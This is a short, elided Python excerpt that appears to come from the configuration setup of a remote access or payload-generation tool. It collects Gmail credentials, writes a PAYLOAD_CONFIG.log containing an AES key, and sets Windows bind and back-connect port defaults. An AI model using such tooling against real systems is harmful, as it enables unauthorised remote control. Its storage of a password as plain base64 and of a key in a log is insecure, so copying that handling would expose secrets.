    ...
    if EMAIL:
        while True:
            ...
            if '@gmail.com' in GMAIL_USER:
                break
        GMAIL_PWD = base64.b64encode(getpass('Enter your email password for {}: '.format(GMAIL_USER)).encode('utf-8')).decode('ascii')
    else:
        GMAIL_USER = "None"
        GMAIL_PWD = ""
...
def get_conf_dir():
    ...
    with open(st_config,'r', encoding='utf-8') as sc:
        content = sc.read()
        content += "\nAES Encryption Key: {}".format(aes_encoded)
        with open(os.path.join(conf_dir,'PAYLOAD_CONFIG.log'),'w', encoding='utf-8') as pc:
            pc.write(content)
...
def gen_default_st_config():
    with open(st_config, 'w', encoding='utf-8') as sc:
        content = '''[Windows]
BIND = True
BHOST =
BPORT = 4433
